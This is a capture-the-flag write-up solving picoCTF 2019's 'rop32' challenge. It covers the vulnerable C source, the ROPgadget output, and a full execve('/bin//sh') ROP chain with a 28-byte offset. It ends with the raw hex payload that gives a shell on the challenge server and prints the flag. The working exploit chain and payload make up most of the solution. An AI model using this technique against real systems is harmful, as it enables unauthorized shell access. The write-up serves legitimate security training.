# Rop32 | PicoCTF2019
## Problem
Can you exploit the following program to get a flag? You can find the program in /problems/rop32_0_b4142d4df31cb73e170c77dac234a79a on the shell server.  
Hint: This is a classic ROP to the get a shell.

## Solution
References:
- https://ctf101.org/binary-exploitation/return-oriented-programming/
- https://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html
- https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf
- https://hwchen18546.wordpress.com/2014/07/15/rop-use-ropgadget-to-chain-gadgets/
- https://github.com/JonathanSalwan/ROPgadget
- https://www.youtube.com/watch?v=MSy0rdi1vbo <--- ROPchain video

### 1. Look at the code
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 16

void vuln() {
  char buf[16];
  printf("Can you ROP your way out of this one?\n");
  return gets(buf);

}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  
}
```
Returning the value of gets(buf) will result in input on the stack, however it will also result in the program immediately ending as there is nowhere else for it to go. There's no flag function this time, so the aim will be to either get a shell or just output the flag.txt on the server somehow, depending on what is possible. Knowing this is a ROP exploit, after doing some research it is clear we need to construct a ROP chain using gadgets within the binary.

### 2. Construct the ROP chain
ROPgadget is a tool that extracts useful gadgets from a binary and can use them to construct a ROP chain that by default, will attempt to open a shell. When using it to generate a chain of instructions, the argument --badbytes 0a ensures there is no newline character bytes present in the chain, as this will cause the gets() function to stop getting input before the chain can be completely read in.
```bash
kali@kali:~/Desktop$ ROPgadget --binary ./vuln --ropchain --badbytes 0a
...
0x0805d264 : xor esi, esi ; mov dword ptr gs:[eax], 0xc ; jmp 0x805d178
0x0806ef6b : xor esi, esi ; mov eax, ebp ; mov ecx, 0x80 ; call dword ptr gs:[0x10]
0x0805ba90 : xor esi, esi ; mov ebx, 0x10 ; jmp 0x805b936
0x08049d58 : xor esi, esi ; mov ecx, dword ptr [ebp - 0x3c] ; mov edx, esi ; mov esi, edi ; jmp 0x8049d7f
0x0804eca3 : xor esi, esi ; pop ebx ; mov eax, esi ; pop esi ; pop edi ; pop ebp ; ret
0x08091dac : xor esi, esi ; ret 0xf01
0x0805786d : xor esi, esi ; xor edi, edi ; jmp 0x80576c4
0x08057855 : xor esi, esi ; xor edi, edi ; jmp 0x80577d4

Unique gadgets found: 29905

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

        [+] Gadget found: 0x8056e65 mov dword ptr [edx], eax ; ret
        [+] Gadget found: 0x806ee6b pop edx ; ret
        [+] Gadget found: 0x8056334 pop eax ; pop edx ; pop ebx ; ret
        [+] Gadget found: 0x8056420 xor eax, eax ; ret

- Step 2 -- Init syscall number gadgets

        [+] Gadget found: 0x8056420 xor eax, eax ; ret
        [+] Gadget found: 0x807c2fa inc eax ; ret

- Step 3 -- Init syscall arguments gadgets

        [+] Gadget found: 0x80481c9 pop ebx ; ret
        [+] Gadget found: 0x806ee92 pop ecx ; pop ebx ; ret
        [+] Gadget found: 0x806ee6b pop edx ; ret

- Step 4 -- Syscall gadget

        [+] Gadget found: 0x8049563 int 0x80

- Step 5 -- Build the ROP chain

        #!/usr/bin/env python2
        # execve generated by ROPgadget

        from struct import pack

        # Padding goes here
        p = ''

        p += pack('<I', 0x0806ee6b) # pop edx ; ret
        p += pack('<I', 0x080da060) # @ .data
        p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
        p += '/bin'
        p += pack('<I', 0x080da060) # padding without overwrite edx
        p += pack('<I', 0x41414141) # padding
        p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
        p += pack('<I', 0x0806ee6b) # pop edx ; ret
        p += pack('<I', 0x080da064) # @ .data + 4
        p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
        p += '//sh'
        p += pack('<I', 0x080da064) # padding without overwrite edx
        p += pack('<I', 0x41414141) # padding
        p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
        p += pack('<I', 0x0806ee6b) # pop edx ; ret
        p += pack('<I', 0x080da068) # @ .data + 8
        p += pack('<I', 0x08056420) # xor eax, eax ; ret
        p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
        p += pack('<I', 0x080481c9) # pop ebx ; ret
        p += pack('<I', 0x080da060) # @ .data
        p += pack('<I', 0x0806ee92) # pop ecx ; pop ebx ; ret
        p += pack('<I', 0x080da068) # @ .data + 8
        p += pack('<I', 0x080da060) # padding without overwrite ebx
        p += pack('<I', 0x0806ee6b) # pop edx ; ret
        p += pack('<I', 0x080da068) # @ .data + 8
        p += pack('<I', 0x08056420) # xor eax, eax ; ret
        p += pack('<I', 0x0807c2fa) # inc eax ; ret
        p += pack('<I', 0x0807c2fa) # inc eax ; ret
        p += pack('<I', 0x0807c2fa) # inc eax ; ret
        p += pack('<I', 0x0807c2fa) # inc eax ; ret
        p += pack('<I', 0x0807c2fa) # inc eax ; ret
        p += pack('<I', 0x0807c2fa) # inc eax ; ret
        p += pack('<I', 0x0807c2fa) # inc eax ; ret
        p += pack('<I', 0x0807c2fa) # inc eax ; ret
        p += pack('<I', 0x0807c2fa) # inc eax ; ret
        p += pack('<I', 0x0807c2fa) # inc eax ; ret
        p += pack('<I', 0x0807c2fa) # inc eax ; ret
        p += pack('<I', 0x08049563) # int 0x80
```

## 3. Add the padding
The offset I can get using a cyclic input from pwntools as normal, except we have to look where the program segfaults to tell us, as there doesnt appear to be any easy point where I can print the stack to see (could be wrong about this though?). This way worked anyway, and in this case, the offset is 28 bytes.
```bash
"./vuln": No such file or directory.
Attaching to process 3983
Reading symbols from /home/kali/Desktop/vuln...
(No debugging symbols found in /home/kali/Desktop/vuln)
0x2aa9e169 in __kernel_vsyscall ()
(gdb) break gets
Breakpoint 1 at 0x8050120
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x61616168 in ?? ()

kali@kali:~/Desktop$ python -c "from pwn import cyclic_find; print(cyclic_find(0x61616168))"
28
```

## 4. Get the flag
Therefore the final payload consists of 28 padding bytes, then the ROP chain constructed by ROPgadget (see solve.py). We can run it locally to test:
```bash
kali@kali:~/Desktop$ python solve.py
[+] Starting local process './vuln': pid 4165
Can you ROP your way out of this one?
[*] Switching to interactive mode

$ whoami
kali
```
And then run it on the server to win.
```bash
jib1337@pico-2019-shell1:/problems/rop32_0_b4142d4df31cb73e170c77dac234a79a$ (python -c "print('\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x6b\xee\x06\x08\x60\xa0\x0d\x08\x34\x63\x05\x08\x2f\x62\x69\x6e\x60\xa0\x0d\x08\x41\x41\x41\x41\x65\x6e\x05\x08\x6b\xee\x06\x08\x64\xa0\x0d\x08\x34\x63\x05\x08\x2f\x2f\x73\x68\x64\xa0\x0d\x08\x41\x41\x41\x41\x65\x6e\x05\x08\x6b\xee\x06\x08\x68\xa0\x0d\x08\x20\x64\x05\x08\x65\x6e\x05\x08\xc9\x81\x04\x08\x60\xa0\x0d\x08\x92\xee\x06\x08\x68\xa0\x0d\x08\x60\xa0\x0d\x08\x6b\xee\x06\x08\x68\xa0\x0d\x08\x20\x64\x05\x08\xfa\xc2\x07\x08\xfa\xc2\x07\x08\xfa\xc2\x07\x08\xfa\xc2\x07\x08\xfa\xc2\x07\x08\xfa\xc2\x07\x08\xfa\xc2\x07\x08\xfa\xc2\x07\x08\xfa\xc2\x07\x08\xfa\xc2\x07\x08\xfa\xc2\x07\x08\x63\x95\x04\x08')"; cat) | ./vuln
Can you ROP your way out of this one?
ls
flag.txt  vuln  vuln.c
cat flag.txt
picoCTF{rOp_t0_b1n_sH_01a585a7}
```